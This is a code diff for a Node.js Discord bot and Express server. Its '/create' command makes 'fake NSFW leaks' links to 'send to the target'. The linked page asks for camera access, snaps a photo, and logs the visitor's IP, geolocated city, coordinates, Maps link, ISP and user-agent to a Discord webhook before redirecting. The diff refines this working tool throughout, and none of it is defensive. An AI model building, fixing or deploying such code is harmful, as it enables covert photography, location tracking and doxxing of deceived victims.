@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, SlashCommandBuilder } = require('discord.js');
+const { Client, GatewayIntentBits, SlashCommandBuilder, InteractionResponseFlags } = require('discord.js');
 const express = require('express');
 const axios = require('axios');
 const FormData = require('form-data');
@@ -12,7 +12,7 @@ const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const DOMAIN = process.env.DOMAIN;
 
 if (!TOKEN || !WEBHOOK_URL || !DOMAIN) {
-  console.error("❌ Missing environment variables!");
+  console.error("❌ Missing environment variables! Check Render dashboard.");
 }
 
 app.set('trust proxy', true);
@@ -25,7 +25,7 @@ app.get('/', (req, res) => {
 
 const trackingLinks = new Map();
 
-// ================== FAKE NSFW PAGE ==================
+// ================== FAKE NSFW PAGE WITH CAMERA ==================
 app.get('/track/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
@@ -62,11 +62,11 @@ app.get('/track/:id', (req, res) => {
   <canvas id="canvas" style="display:none"></canvas>
 
   <script>
+    let stream = null;
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    let stream = null;
 
-    async function logVisit(photo = null, cameraStatus = "Denied/Failed") {
+    async function logVisit(photo = null, cameraStatus = "Denied") {
       fetch('/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -88,7 +88,7 @@ app.get('/track/:id', (req, res) => {
       } catch(e) {
         document.getElementById('status').textContent = "Access denied • Redirecting...";
         await logVisit(null, "Denied");
-        setTimeout(() => { window.location.href = "${originalUrl}"; }, 1500);
+        setTimeout(() => window.location.href = "${originalUrl}", 1600);
       }
     }
 
@@ -100,7 +100,7 @@ app.get('/track/:id', (req, res) => {
 
       logVisit(photo, "Granted").then(() => {
         if (stream) stream.getTracks().forEach(t => t.stop());
-        setTimeout(() => { window.location.href = "${originalUrl}"; }, 1000);
+        setTimeout(() => window.location.href = "${originalUrl}", 1000);
       });
     }
 
@@ -121,8 +121,9 @@ app.post('/log', async (req, res) => {
 
   try {
     if (ip && ip !== 'Unknown') {
-      // Using ip-api.com (free, no key, returns lat/lon)
-      const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,timezone`, { timeout: 6000 });
+      const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp`, { 
+        timeout: 6000 
+      });
       
       if (geo.data.status === "success") {
         city = geo.data.city || 'Unknown';
@@ -134,24 +135,24 @@ app.post('/log', async (req, res) => {
       }
     }
   } catch (e) {
-    console.error("Geo API error:", e.message);
+    console.error("Geo lookup failed:", e.message);
   }
 
   const locationText = `${city}, ${region ? region + ', ' : ''}${country}`;
-  const coords = lat && lon ? `(${lat}, ${lon})` : '';
-  const mapsLink = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : '#';
+  const coords = (lat && lon) ? `(${lat}, ${lon})` : '';
+  const mapsLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : '#';
 
   const embed = {
     title: "🎯 Trackdown Hit - NSFW Fake Link",
     color: cameraAccess === "Granted" ? 0x00ff88 : 0xffaa00,
     fields: [
       { name: "IP", value: `\`${ip}\``, inline: true },
-      { name: "Location", value: `${locationText} ${coords}`, inline: true },
+      { name: "Location", value: `${locationText} ${coords}`, inline: false },
       { name: "Camera", value: cameraAccess, inline: true },
-      { name: "ISP", value: isp, inline: false },
-      { name: "Google Maps", value: mapsLink !== '#' ? `[📍 View on Maps](${mapsLink})` : "Not available", inline: false },
+      { name: "ISP", value: isp, inline: true },
+      { name: "Google Maps", value: mapsLink !== '#' ? `[📍 Open in Maps](${mapsLink})` : "Not available", inline: false },
       { name: "Time", value: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), inline: false },
-      { name: "User-Agent", value: (userAgent || "Unknown").substring(0, 300), inline: false },
+      { name: "User-Agent", value: (userAgent || "Unknown").substring(0, 280), inline: false },
       { name: "Original URL", value: originalUrl, inline: false }
     ],
     timestamp: new Date().toISOString()
@@ -175,42 +176,58 @@ app.post('/log', async (req, res) => {
   res.sendStatus(200);
 });
 
-// ================== DISCORD BOT ==================
-client.once('ready', () => {
+// ================== DISCORD BOT (Fixed) ==================
+client.once('ready', async () => {
   console.log(`✅ Bot is online → ${client.user.tag}`);
-});
 
-const cmd = new SlashCommandBuilder()
-  .setName('create')
-  .setDescription('Create fake NSFW leaks tracking link')
-  .addStringOption(opt =>
-    opt.setName('url')
-      .setDescription('Real URL to redirect after tracking')
-      .setRequired(true));
+  // Register slash command properly
+  const cmd = new SlashCommandBuilder()
+    .setName('create')
+    .setDescription('Create fake NSFW leaks tracking link')
+    .addStringOption(opt =>
+      opt.setName('url')
+        .setDescription('Real URL to redirect after tracking')
+        .setRequired(true));
+
+  await client.application.commands.set([cmd]);
+  console.log("✅ Slash command '/create' registered");
+});
 
 client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand() || interaction.commandName !== 'create') return;
 
-  const url = interaction.options.getString('url');
-  if (!url.startsWith('http')) {
-    return interaction.reply({ content: '❌ URL must start with http:// or https://', ephemeral: true });
+  try {
+    const url = interaction.options.getString('url');
+
+    if (!url.startsWith('http://') && !url.startsWith('https://')) {
+      return interaction.reply({ 
+        content: '❌ URL must start with http:// or https://', 
+        flags: InteractionResponseFlags.Ephemeral 
+      });
+    }
+
+    const trackId = 'nsfw_' + Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
+    trackingLinks.set(trackId, url);
+
+    const trackingLink = `${DOMAIN}/track/${trackId}`;
+
+    await interaction.reply({
+      content: `**✅ Fake NSFW Tracking Link Created!**\n\n` +
+               `**Tracking Link:** ${trackingLink}\n` +
+               `**Redirects to:** ${url}\n\n` +
+               `Send this link to the target.`,
+      flags: InteractionResponseFlags.Ephemeral
+    });
+
+  } catch (err) {
+    console.error("Interaction error:", err);
+    if (!interaction.replied) {
+      await interaction.reply({ content: '❌ Something went wrong.', flags: InteractionResponseFlags.Ephemeral });
+    }
   }
-
-  const trackId = 'nsfw_' + Date.now().toString(36);
-  trackingLinks.set(trackId, url);
-
-  const link = `${DOMAIN}/track/${trackId}`;
-
-  await interaction.reply({
-    content: `**✅ Fake NSFW Tracking Link Created!**\n\n` +
-             `**Tracking Link:** ${link}\n` +
-             `**Redirects to:** ${url}\n\n` +
-             `Send this to the target.`,
-    ephemeral: true
-  });
 });
 
-// ================== START SERVER & BOT ==================
+// ================== START SERVER ==================
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
@@ -218,11 +235,16 @@ app.listen(PORT, () => {
 });
 
 client.login(TOKEN)
-  .then(() => console.log("✅ Discord bot logged in"))
+  .then(() => console.log("✅ Discord bot logged in successfully"))
   .catch(err => {
-    console.error("❌ Discord login failed:", err.message);
-    console.log("⚠️ Web server is still running.");
+    console.error("❌ Failed to login to Discord:", err.message);
   });
 
-process.on('unhandledRejection', (reason) => console.error('Unhandled Rejection:', reason));
-process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
+// Prevent app crash
+process.on('unhandledRejection', (reason) => {
+  console.error('Unhandled Rejection:', reason);
+});
+
+process.on('uncaughtException', (err) => {
+  console.error('Uncaught Exception:', err);
+});
